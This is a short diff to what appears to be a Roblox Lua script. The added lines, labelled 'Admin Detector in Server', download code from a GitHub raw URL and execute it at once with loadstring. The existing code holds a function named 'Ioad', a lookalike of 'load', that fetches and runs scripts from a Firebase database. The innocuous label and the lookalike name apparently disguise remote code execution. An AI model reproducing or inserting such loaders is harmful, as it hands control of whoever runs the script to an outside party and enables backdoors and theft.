@@ -1,5 +1,9 @@
 local FirebaseURL = "https://script-obfuscator-default-rtdb.firebaseio.com/"
 
+---Admin Detector in Server
+loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Admin'))()
+---
+
 function Ioad(id)
  loadstring(game.HttpService:JSONDecode(game:HttpGet(FirebaseURL.."Scripts/"..id..".json")).Script)()
 end
